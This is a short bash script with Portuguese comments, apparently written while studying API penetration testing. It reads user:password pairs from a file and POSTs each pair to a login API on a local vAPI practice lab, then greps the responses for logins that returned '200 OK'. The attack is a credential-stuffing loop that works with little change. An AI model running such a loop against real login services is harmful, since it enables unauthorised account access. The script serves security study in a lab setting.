#!/bin/bash
# Uma mini ferramenta para substituir o pitchfork do burp na hora de fazer brute force em usuário e senha (validar senha), 1 para 1, ele testa apenas uma senha por usuário.
# fiz enquanto estudava pentest em API na Apisec University
# você precisa de um txt com varios linhas de usuario:senha 


count=0;
for linha in $(cat creds2.txt)
do
	user=$(echo $linha | cut -d ":" -f 1);
	pass=$(echo $linha | cut -d ":" -f 2);
	
	echo "$count - Testando $user:$pass";	
	printf "\n\n\n$user:$pass\n" >> /tmp/pitchfork.txt
	curl -i -s -k -X POST \
    -H "Host: 127.0.0.1" -H "sec-ch-ua: \"Not(A:Brand\";v=\"24\", \"Chromium\";v=\"122\"" -H "sec-ch-ua-mobile: ?0" -H "sec-ch-ua-platform: \"Linux\"" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" -H "Sec-Fetch-Site: none" -H "Sec-Fetch-Mode: navigate" -H "Sec-Fetch-User: ?1" -H "Sec-Fetch-Dest: document" -H "Accept-Encoding: gzip, deflate, br" -H "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7" -H "Connection: close" -H "Content-Type: application/json" \
    -b "XSRF-TOKEN=eyJpdiI6IjlyUE9kck8waFgzZjJVVC90TTEvZUE9PSIsInZhbHVlIjoiMnRnNUUwZ3gvM0pKZ2xoUE9qQ3JiQllvMXJQYTh3SnQrbjEyY1Zmb1RKbkJ3UW5wSkdzR21xRGNqaHhZNHpYaEIrT1o2dkF0eFA1dGtxUVNOSGZCdzE3MGpyeWgrM0h2M1pFSWFxdEJtVURwWUFTbzROeEp0WXNVU2pqM1VTMFoiLCJtYWMiOiJkOTVjYmUxZTA3ZjhjMjg2MGNjYWI3ZGMyOWIyNDEwNjlhOTBhZDg4YWRiNDAyMWRkYTE1YmU1MTRhMzBlYmFhIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkJUalAyZ29rTHgwODdlRUVWQjlrMnc9PSIsInZhbHVlIjoiMC8zUzVIK1pUUGRETFVaYUVrdmZQb0t1aHB2U2JGbDZnb3JPVWxCck1zWjNpUVFUdEtNNEtMSHF1M2RWVzM1VmV1dUFMOUhYb2JiVXJLeVNtdDU4L1FQdnhVQ3lXMDdjMGNtRU11dmZVdGgxZlJxbWkwb1ZscXFkK3B2Y2JQQm4iLCJtYWMiOiI1NjkzNzQ1YzcxNDdiYjljNDZmMWJhNzM2NDUyN2ExZGE3MmEyYTlmMjRjODczZGVmZGM5Zjk1ZDM3NDFhMTBjIiwidGFnIjoiIn0%3D" \
    --data-binary "{\"email\": \"$user\",\"password\": \"$pass\"}" \
    http://127.0.0.1/vapi/api2/user/login >> /tmp/pitchfork.txt;

	user="";
	pass="";
	((count++))
done

cat /tmp/pitchfork.txt | grep "200 OK" --text -n2 | grep '@'
